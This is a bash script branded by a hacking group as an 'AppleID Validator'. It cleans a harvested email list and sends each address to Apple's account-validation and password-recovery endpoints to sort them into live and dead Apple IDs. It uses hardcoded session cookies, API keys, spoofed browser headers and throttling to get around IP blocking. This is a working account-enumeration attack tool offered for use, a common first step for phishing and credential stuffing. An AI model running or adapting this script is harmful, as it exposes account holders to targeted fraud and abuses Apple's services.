#!/bin/bash
# GH0STN3T Family Present
# Apple Valid Checker 2019
# 25 February 2019

RED='\033[0;31m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
ORANGE='\033[0;33m' 
PUR='\033[0;35m'
GRN="\e[32m"
WHI="\e[37m"
NC='\033[0m'
echo ""
printf "$RED ███▓███████▓▓╬╬╬╬╬╬╬╬╬╬╬╬▓███▓▓▓▓█▓╬╬╬▓█ \n"
printf "$RED ███████▓█████▓▓╬╬╬╬╬╬╬╬▓███▓╬╬╬╬╬╬╬▓╬╬▓█ \n"
printf "$RED ████▓▓▓▓╬╬▓█████╬╬╬╬╬╬███▓╬╬╬╬╬╬╬╬╬╬╬╬╬█ \n"
printf "$RED ███▓▓▓▓╬╬╬╬╬╬▓██╬╬╬╬╬╬▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█ \n"
printf "$RED ███▓█▓███████▓▓███▓╬╬╬╬╬╬▓███████▓╬╬╬╬▓█ \n"
printf "$RED ████████████████▓█▓╬╬╬╬╬▓▓▓▓▓▓▓▓╬╬╬╬╬╬╬█ \n"
printf "$RED ███▓█▓▓▓▓▓▓▓▓▓▓▓▓▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█ \n"
printf "$RED █████▓▓▓▓▓▓▓██▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██ \n"
printf "$WHI ████▓█▓▓▓▓██▓▓▓▓██╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██ \n"
printf "$WHI █████▓███▓▓▓▓▓▓▓▓████▓▓╬╬╬╬╬╬╬█▓╬╬╬╬╬▓██ \n"
printf "$WHI █████▓▓█▓███▓▓▓████╬▓█▓▓╬╬╬▓▓█▓╬╬╬╬╬╬███ \n"
printf "$WHI ██████▓██▓███████▓╬╬╬▓▓╬▓▓██▓╬╬╬╬╬╬╬▓███ \n"
printf "$WHI ███████▓██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓╬╬╬╬╬╬╬╬╬╬╬████ \n"
printf "$WHI ████████▓▓▓█████▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█████ \n"
printf "$NC\n"
cat <<EOF
             -Challenger Deep Hacker Organization -
          [+] jon.paijo@yandex.com [+]
        
---------------------------------------------------
   Retjeh Team Family - AppleID Validator 2019
---------------------------------------------------

EOF

usage() { 
  echo "Usage: ./myscript.sh COMMANDS: [-i <list.txt>] [-r <folder/>] [-l {1-1000}] [-t {1-10}] OPTIONS: [-d] [-c]

Command:
-i (20k-US.txt)     File input that contain email to check
-r (result/)        Folder to store the result live.txt and die.txt
-l (60|90|110)      How many list you want to send per delayTime
-t (3|5|8)          Sleep for -t when check is reach -l fold

Options:
-d                  Delete the list from input file per check
-c                  Compress result to compressed/ folder and
                    move result folder to haschecked/
-h                  Show this manual to screen
-u                  Check integrity file then updatef

Report any bugs to: <GH0STN3T> contact@boyfernanda.id
"
  exit 1 
}

# Assign the arguments for each
# parameter to global variable
while getopts ":i:r:l:t:dchu" o; do
    case "${o}" in
        i)
            inputFile=${OPTARG}
            ;;
        r)
            targetFolder=${OPTARG}
            ;;
        l)
            sendList=${OPTARG}
            ;;
        t)
            perSec=${OPTARG}
            ;;
        d)
            isDel='y'
            ;;
        c)
            isCompress='y'
            ;;
        h)
            usage
            ;;
        u)
            updater "manual"
            ;;
    esac
done

# Do automatic update
# before passing arguments
echo "[+] Doing an automatic update from server gh0stn3t.com on `date`"
updater "auto"

if [[ $inputFile == '' || $targetFolder == '' || $sendList == '' || $perSec == '' ]]; then
  cli_mode="interactive"
else
  cli_mode="interpreter"
fi

# Assign false value boolean
# to both options when its null
if [ -z "${isDel}" ]; then
  isDel='n'
fi

if [ -z "${isCompress}" ]; then
  isCompress='n'
fi

SECONDS=0

# Asking user whenever the
# parameter is blank or null
if [[ $inputFile == '' ]]; then
  # Print available file on
  # current folder
  # clear
  tree
  read -p "Enter mailist file: " inputFile
fi

if [[ $targetFolder == '' ]]; then
  read -p "Enter target folder: " targetFolder
  # Check if result folder exists
  # then create if it didn't
  if [[ ! -d "$targetFolder" ]]; then
    echo "[+] Creating $targetFolder/ folder"
    mkdir $targetFolder
  else
    read -p "$targetFolder/ folder are exists, append to them ? [y/n]: " isAppend
    if [[ $isAppend == 'n' ]]; then
      exit
    fi
  fi
else
  if [[ ! -d "$targetFolder" ]]; then
    echo "[+] Creating $targetFolder/ folder"
    mkdir $targetFolder
  fi
fi

if [[ $isDel == '' || $cli_mode == 'interactive' ]]; then
  read -p "Delete list per check ? [y/n]: " isDel
fi

if [[ $isCompress == '' || $cli_mode == 'interactive' ]]; then
  read -p "Compress the result ? [y/n]: " isCompress
fi

if [[ $sendList == '' ]]; then
  read -p "How many list send: " sendList
fi

if [[ $perSec == '' ]]; then
  read -p "Delay time: " perSec
fi

malhadi_appleval() {
  SECONDS=0

  check=`curl 'https://appleid.apple.com/account/validation/appleid' -H 'scnt: '$scnt'' -H 'Origin: https://appleid.apple.com' -H 'Accept-Encoding: gzip, deflate, br' -H 'X-Apple-I-FD-Client-Info: {"U":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36","L":"en-US","Z":"GMT+08:00","V":"1.1","F":"sWa44j1e3NlY5BSo9z4ofjb75PaK4Vpjt3Q9cUVlOrXTAxw63UYOKES5jfzmkflJfmczl998tp7ppfAaZ6m1CdC5MQjGejuTDRNziCvTDfWk3qwyWEQEe6qgXK_Pmtd0SHp815LyjaY2.rINj.rINYOK0UjVsYUMnGWFfwMHDCQyG5me6sBLSsbXzU0l6sqKIrGfuzwg9wK9weEwHXXTSHCSPmtd0wVYPIG_qvoPfybYb5EvYTrYesR0CjEcIqnuWxf7_OLgiPFMtrs1OeyjaY2_GGEQIgwe98vDdYejftckuyPBDjaY2ftckZZLQ084akJlJWu_uWA16fUfR0odm_dhrxbuJjkWxv5iJ6KVg8cGYiKY.6elV2pN9csgdmX3ivm_Ud_UeAwHCSFQ_0pNvS_MNJZNlY5DuV25BNnOVgw24uy.CfT"}' -H 'Accept-Language: en-US,en;q=0.9,id;q=0.8,fr;q=0.7,la;q=0.6' -H 'X-Requested-With: XMLHttpRequest' -H 'Cookie: idclient=web; dslang=US-EN; site=USA; aidsp='$sessionId'; ccl=OXqm9r6b+jMZIrOKHBgGZQ==; geo=ID' -H 'Connection: keep-alive' -H 'X-Apple-Api-Key: '$apiKey'' -H 'X-Apple-ID-Session-Id: '$sessionId'' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36' -H 'Content-Type: application/json' -H 'Accept: application/json, text/javascript, */*; q=0.01' -H 'Referer: https://appleid.apple.com/account' -H 'X-Apple-Request-Context: create' --data-binary '{"emailAddress":"'$1'"}' --compressed -D - -s`
  # check=`curl --proxy 195.9.237.66:8080 'https://appleid.apple.com/account/validation/appleid' -H 'scnt: '$scnt'' -H 'Origin: https://appleid.apple.com' -H 'Accept-Encoding: gzip, deflate, br' -H 'X-Apple-I-FD-Client-Info: {"U":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36","L":"en-US","Z":"GMT+08:00","V":"1.1","F":"sWa44j1e3NlY5BSo9z4ofjb75PaK4Vpjt3Q9cUVlOrXTAxw63UYOKES5jfzmkflJfmczl998tp7ppfAaZ6m1CdC5MQjGejuTDRNziCvTDfWk3qwyWEQEe6qgXK_Pmtd0SHp815LyjaY2.rINj.rINYOK0UjVsYUMnGWFfwMHDCQyG5me6sBLSsbXzU0l6sqKIrGfuzwg9wK9weEwHXXTSHCSPmtd0wVYPIG_qvoPfybYb5EvYTrYesR0CjEcIqnuWxf7_OLgiPFMtrs1OeyjaY2_GGEQIgwe98vDdYejftckuyPBDjaY2ftckZZLQ084akJlJWu_uWA16fUfR0odm_dhrxbuJjkWxv5iJ6KVg8cGYiKY.6elV2pN9csgdmX3ivm_Ud_UeAwHCSFQ_0pNvS_MNJZNlY5DuV25BNnOVgw24uy.CfT"}' -H 'Accept-Language: en-US,en;q=0.9,id;q=0.8,fr;q=0.7,la;q=0.6' -H 'X-Requested-With: XMLHttpRequest' -H 'Cookie: idclient=web; dslang=US-EN; site=USA; aidsp='$sessionId'; ccl=OXqm9r6b+jMZIrOKHBgGZQ==; geo=ID' -H 'Connection: keep-alive' -H 'X-Apple-Api-Key: '$apiKey'' -H 'X-Apple-ID-Session-Id: '$sessionId'' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36' -H 'Content-Type: application/json' -H 'Accept: application/json, text/javascript, */*; q=0.01' -H 'Referer: https://appleid.apple.com/account' -H 'X-Apple-Request-Context: create' --data-binary '{"emailAddress":"'$1'"}' --compressed -D - -s`
  duration=$SECONDS
  header="`date +%H:%M:%S` from $inputFile to $targetFolder"
  footer="[GH0STN3T - AppleValid 2019] $(($duration % 60))sec.\n"
  val="$(echo "$check" | grep -c 'used" : true')"
  inv="$(echo "$check" | grep -c 'used" : false')"
  bad="$(echo "$check" | grep -c 'valid" : false')"
  icl="$(echo "$check" | grep -c 'appleOwnedDomain" : true')"

  if [[ $val > 0 || $icl > 0 ]]; then
    printf "[$header] $2/$3. ${CYAN}LIVE => $1 ${NC} $footer"
    echo "LIVE => $1" >> $4/live.txt
  else
    if [[ $inv > 0 || $bad > 0 ]]; then
      printf "[$header] $2/$3. ${PUR}DIE => $1 ${NC} $footer"
      echo "DIE => $1" >> $4/die.txt
    else
      printf "[$header] $2/$3. ${WHI}UNKNOWN => $1 ${NC} $footer"
      echo "$1 => $check" >> reason.txt
      echo "UNKNOWN => $1" >> $inputFile
    fi
  fi

  printf "\r"
}

malhadi_appleval_second() {
  SECONDS=0

  check=`curl -m 12 'https://iforgot.apple.com/password/verify/appleid' -H 'Cookie: geo=ID; ccl=1Rffj3piwvuOni4v5pXUww==; s_fid=4C8AEE671F557D21-08EB0A1C0DD1E6AC; s_pathLength=homepage%3D1%2C; s_cc=true; s_vi=[CS]v1|2DF2C496052E1F83-40000C5160001430[CE]; s_ptc=0.000%5E%5E0.110%5E%5E0.064%5E%5E0.480%5E%5E0.175%5E%5E0.026%5E%5E1.377%5E%5E0.017%5E%5E1.257%5E%5E2.654%5E%5E0.001%5E%5E3.506; dssid2=a0961435-7bb2-4972-a088-eb33715418bd; dssf=1; as_xs=cr=1; as_pcts=kj6E:eSjJ956l2PvB:GGaVfKgrkaeI:+LT7KQFk_uJFrP+LdcUg7R-whasymaEvsere; as_dc=nwk; as_xsm=1&joa9mry1/us&irrSsRgNzsUnFC9bjeiiMg; as_sfa=Mnx1c3x1c3x8ZW5fVVN8Y29uc3VtZXJ8aW50ZXJuZXR8MHwwfDE=; pxro=2; dslang=US-EN; site=USA; ndcd=wc1.1.w-046483.1.2.nOPvcYTfWIpGZEYtJrN6dQ%252C%252C.-8fApaZ5rdJWPkCbJv27ICHsu248PiKGlJhm6m1xEuwjF-oHTxEy1HjM7FfrT0VIoEFueoLO1vr3UrA7FopzqVFMsqWW9YSsrtbiY1eIUvgba3t2BUO7fJC2q2CXU2Vo7ID5cJpu2u4tGVypItPj53EGjzcl2fXM2Ny5Pm8aP6vyK_gBL1SElR4JUkfklaIS; idclient=web; ifssp=C0C2F2C71F87C58BB3E715183906A81E2826FE91569C0B14144E422E2457C60D5042297A9E767252B0FCED4A01382910D1A7FD44C5929825ACE89743C6947BE05F123E2A2408133AF6452567FE725D807EB060B37F1E71C7B2A2F950A36399F7FDE5210B2332E3C5775E56CDDBE85E503BE1870D95408FEB; X-Apple-I-Web-Token=AAAAKjN8MWEyZmEyNjNhZTkxOWE0ZmNhMTc0YTQ3NWQzMGM0OTAAAAFm+LzCPICNkWvGyCl7cPuTxuH6sEHLrwvOyxXF/owmdSxUJFNL8T6leiAzAAD25rFPjHGyuA9LNx9NdjrjEhuMZ5BHexo40pcFHGlTANR+RzfmQg==' -H 'Origin: https://iforgot.apple.com' -H 'Accept-Encoding: gzip, deflate, br' -H 'X-Apple-I-FD-Client-Info: {"U":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36","L":"en-US","Z":"GMT+08:00","V":"1.1","F":"Fda44j1e3NlY5BSo9z4ofjb75PaK4Vpjt3Q9cUVlOrXTAxw63UYOKES5jfzmkflFflNzl998tp7ppfAaZ6m1CdC5MQjGejuTDRNziCvTDfWogCjC8ZxRtOUPm8LKfAaZ4pAJZ7OQuyPBB2SCXw2SCXC_J4yy2XCxUC541jlS7spjt3Q9cUVlOrXTAxw63UYOKES5jfzmkflFflNzl998tp7ppfAaZ6m1CdC5MQjGejuTDRNziCvTDfWogCjC8ZxRtOUPm8LKfAaZ4ySy.aPjftckvIz4jIskOtJJIqSI6KUMnGWpwoNSUC56MnGW87gq1HACVdV___WBd8cFrur.S9RdPQSzOy_Aw7UTlf_0pNA1P3Nv_IU.6elV2pN9JvgRcWprUqUdBzJbrgPuVr92ekL4Jhq485BNlYicklY5BqNAE.lTjV.297"}' -H 'Accept-Language: en-US,en;q=0.9,id;q=0.8,fr;q=0.7,la;q=0.6' -H 'sstt: wq%2BYimvHnl7srugs25ohSos3L%2F1aJq4M1HTCeKvHnX8lv6AAquJZq7hEptT%2BEmhRv9C%2B%2BJPgxiMTGajIypqBGB%2B%2FQtbJKP6OVHQrS2XPFFMdRBL5x87ey0GUFfKASrKa%2FxazcABolHkgqC8OFxBwBGXVnsSk%2FO1I6U8aAXZ4tbxJblKFOM18mS4PrPgcz2nCwnGYv9keV1oeqIs%2BCn2X2wfBRgUWEih%2Fzsga7Di4Dp%2BO5dvdZH4aVryhWXJvMqm6v0qcU1wReRjdIoSNfBqKDxCbZ1xjrr2BP%2BiQ2agErfMunKvGnWGLtAXgu0d5PQy%2FeShpz3lRRRlwqvVgjdpq33LSKHGbzcY%2BMBsKVXQeFSnGXYAmXExsWl8HkaXYinubG9VpWusxtCBwehlS' -H 'X-Requested-With: XMLHttpRequest' -H 'Connection: keep-alive' -H 'Pragma: no-cache' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36' -H 'Content-Type: application/json' -H 'Accept: application/json, text/javascript, */*; q=0.01' -H 'Cache-Control: no-cache' -H 'Referer: https://iforgot.apple.com/password/verify/appleid' --data-binary '{"id":"'$1'"}' --compressed -D - -s -L`
  duration=$SECONDS
  header="`date +%H:%M:%S` from $inputFile to $targetFolder"
  footer="[GH0STN3T - AppleValid Late 2019] $(($duration % 60))sec.\n"
  val="$(echo "$check" | grep -c 'session/timeout')"
  inv="$(echo "$check" | grep -c 'account/emailnotfound\|account/notfound\|This person record is inactive\|This Apple ID is not active')"

  if [[ $val > 0 ]]; then
    printf "[$header] $2/$3. ${GRN}LIVE => $1 ${NC} $footer"
    echo "LIVE => $1" >> $4/live.txt
  else
    if [[ $inv > 0 ]]; then
      printf "[$header] $2/$3. ${PUR}DIE => $1 ${NC} $footer"
      echo "DIE => $1" >> $4/die.txt
    else
      printf "[$header] $2/$3. ${WHI}UNKNOWN => $1 ${NC} $footer"
      echo "$1 => $check" >> reason.txt
      echo "UNKNOWN => $1" >> $inputFile
    fi
  fi

  printf "\r"
}







if [[ ! -f $inputFile ]]; then
  echo "[404] File mailist not found. Check your mailist file name."
  ls -l
  exit
fi

# Preparing file list 
# by using email pattern 
# every line in $inputFile
echo "[+] Cleaning your mailist file"
grep -Eiorh '([[:alnum:]_.-]+@[[:alnum:]_.-]+?\.[[:alpha:].]{2,6})' $inputFile | tr '[:upper:]' '[:lower:]' | sort | uniq > temp_list && mv temp_list $inputFile

# Finding match mail provider
echo "########################################"
# Print total line of mailist
totalLines=`grep -c "@" $inputFile`
echo "There are $totalLines of list."
echo " "
echo "Hotmail: `grep -c "@hotmail" $inputFile`"
echo "Yahoo: `grep -c "@yahoo" $inputFile`"
echo "Gmail: `grep -c "@gmail" $inputFile`"
echo "########################################"

# Extract email per line
# from both input file
IFS=$'\r\n' GLOBIGNORE='*' command eval  'mailist=($(cat $inputFile))'
con=1

getKey() {
  echo "Generating token now. Please wait..."
  wait
  resp=`curl 'https://appleid.apple.com/account' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'Connection: keep-alive' -H 'Accept-Encoding: gzip, deflate, br' -H 'Accept-Language: en-US,en;q=0.9,id;q=0.8,fr;q=0.7,la;q=0.6' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36' --compressed -D - -s -o /dev/null`
  scnt="$(echo "$resp" | grep "scnt: " | cut -c7- | xargs)"
  sessionId="$(echo "$resp" | grep "aidsp" | awk -F[=\;] '{print $2}' | xargs)"
  apiKey='cbf64fd6843ee630b463f358ea0b707b'

  # echo "$resp"
  # echo "SCNT: $scnt"
  # echo "SESSIONID: $sessionId"

  if [[ $scnt == '' || $sessionId == '' || $apiKey = '' ]]; then
    echo "IP Blocked by Apple."
    sleep 20
    getKey
    sleep 2
  fi
}

# getKey


sendList="1"
perSec="1"
echo "[+] Script forced to use default ratio."
echo "[+] Sending $sendList email per $perSec seconds"

for (( i = 0; i < "${#mailist[@]}"; i++ )); do
  username="${mailist[$i]}"
  indexer=$((con++))
  tot=$((totalLines--))
  fold=`expr $i % $sendList`
  if [[ $fold == 0 && $i > 0 ]]; then
    header="`date +%H:%M:%S`"
    duration=$SECONDS
    echo "[$header] Waiting $perSec second. $(($duration / 3600 / 24)) day $(($duration / 3600 % 24)) hours $(($duration / 60 % 60)) minutes $(($duration % 60)) seconds elapsed, With $sendList req / $perSec seconds."
    sleep $perSec
  fi
  # vander=`expr $i % 9`
  # if [[ $vander == 0 && $i > 0 ]]; then
    # getKey
  # fi
  
  # malhadi_appleval "$username" "$indexer" "$tot" "$targetFolder" "$inputFile" &
  malhadi_appleval_second "$username" "$indexer" "$tot" "$targetFolder" "$inputFile" &

  if [[ $isDel == 'y' ]]; then
    grep -v -- "$username" $inputFile > "$inputFile"_temp && mv "$inputFile"_temp $inputFile
  fi
done 

# waiting the background process to be done
# then checking list from garbage collector
# located on $targetFolder/unknown.txt
echo "[+] Waiting background process to be done"
wait
wc -l $targetFolder/*

if [[ $isCompress == 'y' ]]; then
  tgl=`date`
  tgl=${tgl// /-}
  zipped="$targetFolder-$tgl.zip"

  echo "[+] Compressing result"
  zip -r "compressed/$zipped" "$targetFolder/die.txt" "$targetFolder/live.txt"
  echo "[+] Saved to compressed/$zipped"
  mv $targetFolder haschecked
  echo "[+] $targetFolder has been moved to haschecked/"
fi
#rm $inputFile
duration=$SECONDS
echo "$(($duration / 3600)) hours $(($duration / 60)) minutes and $(($duration % 60)) seconds elapsed."
echo "+==========+ GH0STN3T Family - Applevalid 2019 - BoyFernanda +==========+"